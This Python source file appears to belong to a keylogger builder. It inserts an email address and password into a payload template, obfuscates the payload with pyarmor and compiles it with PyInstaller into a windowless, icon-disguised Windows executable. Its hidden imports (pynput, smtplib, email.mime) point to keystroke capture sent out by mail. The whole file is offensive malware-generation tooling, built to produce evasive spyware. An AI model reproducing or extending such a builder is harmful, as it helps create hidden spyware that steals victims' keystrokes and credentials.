import os
from ..variables.variables import *
from ..utils.utils import *

class ModuleUtils(Utils):
    """
    The ModuleUtils class provides various utility functions for different modules.
    This class offers a pipeline that includes generating payloads, obfuscation, converting to executable files,
    and cleaning up the process.
    """
    def __init__(self) -> None:
        """
        Constructor method for the ModuleUtils class.
        """
        super().__init__()
        
    def pipeline_a(self, module : str, payload : str, mail : str, password : str, timeout : int, name : str, icon_path : str) -> None:
        """
        Initiates the pipeline process. This includes generating the payload, obfuscating it, converting it to an executable,
        and performing final cleanup steps.
        
        Args:
            module (str): The name of the module to use.
            payload (str): The name of the payload file to use.
            mail (str): User's email address.
            password (str): User's password.
            timeout (int): Timeout duration.
            name (str): The name of the file to create.
            icon_path (str): Path to the icon file to use.
        """
        self.generate(payload=payload, module=module, mail=mail, password=password, timeout=timeout, name=name)
        self.obfuscate(name=name)
        self.convert_to_exe(module=module, name=name, icon_path=icon_path)
        self.final(name=name, module=module)
        
    def generate(self, payload: str, module: str, mail: str, password: str, timeout: int, name: str) -> None:
        """
        Generates the payload file and inserts the provided information.
        
        Args:
            payload (str): The name of the payload file to use.
            module (str): The name of the module to use.
            mail (str): User's email address.
            password (str): User's password.
            timeout (int): Timeout duration.
            name (str): The name of the file to create.
        """
        self.clear()
        if OS == "windows":
            payload_path: str = f"packages\\payloads\\{module}\\{payload}"
        else:
            payload_path: str = f"./packages/payloads/{module}/{payload}"

        payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))

        with open(name, "w", encoding="utf-8") as file:
            with open(payload_location, 'r', encoding='utf-8') as file1:
                file_content = file1.read()
                file_content = file_content.replace("userMail_", mail)
                file_content = file_content.replace("userPassword_", password)
                file_content = file_content.replace("timeOut_", str(timeout))
                file.write(file_content)

    def obfuscate(self, name : str) -> None:
        """
        Obfuscates the generated payload file using pyarmor.
        
        Args:
            name (str): The name of the file to obfuscate.
        """
        try:
            os.system(f"pyarmor gen {name}")

        except Exception as e:
            self.write(message=f"ERROR: {str(e)}", level=4)
    
    def convert_to_exe(self, module : str, name : str, icon_path : str) -> None:
        """
        Converts the obfuscated payload file into an executable.
        
        Args:
            module (str): The name of the module to use.
            name (str): The name of the file to convert.
            icon_path (str): Path to the icon file to use.
        """
        match module.lower():
            case "keylogger":
                try:
                    if OS == "windows":
                        icon_option = f"--icon={icon_path}" if icon_path else ""
                        os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                                --hidden-import=smtplib --hidden-import=email.mime.multipart --hidden-import=email.mime.text --hidden-import=email.mime.base \
                                --hidden-import=email --hidden-import=threading --hidden-import=pyarmor --hidden-import=pywin32 --hidden-import=tempfile --noconsole --clean {icon_option} .\\dist\\{name}")
                    else:
                        icon_option = f"--icon={icon_path}" if icon_path else ""
                        os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                                --hidden-import=smtplib --hidden-import=threading --hidden-import=pyarmor --hidden-import=email.mime.multipart --hidden-import=email.mime.text \
                                --hidden-import=email.mime.base --hidden-import=email --hidden-import=pywin32 --hidden-import=tempfile --noconsole {icon_option} ./dist/{name}")
                
                except Exception as e:
                    self.write(f"ERROR: {str(e)}", type=4)
                    
            case _:
                self.write("Invalid module.", level=4)
        
    def final(self, name : str, module : str) -> None:
        """
        Cleans up the process by removing temporary files and displaying the final location of the created executable.
        
        Args:
            name (str): The name of the file.
            module (str): The name of the module used.
        """
        if OS == "windows":
            os.remove(name)
            os.remove(f"dist\\{name}")
        else:
            os.remove(name)
            os.remove(f"dist/{name}")

        os.remove(name.replace("py", "spec"))
        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        self.dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        if OS == "windows":
            self.write(message=f"{module.capitalize()} Was Created On this Location: {self.dist_folder}\\dist\\{exe_location}", level=4, clear=True)

        else:
            self.write(message=f"{module.capitalize()} Was Created On this Location: {self.dist_folder}/dist/{exe_location}", level=4, clear=True)
            
    def list_payloads(self, module : str) -> list[str]:
        """
        Lists available payloads for the specified module.
        
        Args:
            module (str): The name of the module to list payloads for.

        Returns:
            list[str]: A list of available payload names.
        """
        self.clear()
        payloads : list[str] = os.listdir(f"./packages/payloads/{module}/")
        print(f"""{COLOR['CYAN']}
            ╔══════════════════════════════════════════════════════════════════════════╗
            ║*                               - PAYLOADS -                             *║
            ╠══════════════════════════════════════╦═══════════════════════════════════╣
            ║            Payload Number            ║           Payload Name            ║         
            ╠══════════════════════════════════════╩═══════════════════════════════════╣ """)
        i = 0
        for payload in payloads:
            i += 1
            print(f"\t    ║ [{i}] {COLOR['RESET']}{payload}{COLOR['CYAN']} {' ' * (68 - len(payload))}║")

        print("\t    ╚══════════════════════════════════════════════════════════════════════════╝")
        chc = input("\nPress [Enter] To Continue.  ")
        if chc == "":
            self.run()
            
        else:
            self.clear()
            self.listPayloads(module)